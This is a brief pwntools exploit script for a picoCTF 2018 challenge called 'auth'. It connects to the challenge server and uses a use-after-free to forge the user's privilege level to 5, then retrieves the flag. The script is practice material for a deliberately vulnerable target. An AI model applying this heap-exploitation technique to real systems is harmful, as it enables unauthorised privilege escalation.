from pwn import *
from bayb0pwn import *

elf = ELF('./auth')
r = remote('2018shell.picoctf.com', 41208 )

def _login( name ):
  r.sendlineafter('> ', b'login '+name )

def _reset():
  r.sendlineafter('> ', b'reset')

def _getflag():
  r.sendlineafter('> ', b'get-flag' )
  return r.recvline()[:-1]

payload = b''
payload += b'A'*0x08
payload += p64(5)
_login( payload )

_reset()  #next malloc of user return the pointer which username was freed just before. Moreover user.level is set to 5.

payload = b''
payload += b'UNKO'
_login( payload )

info( "flag: %s"%(_getflag()) )
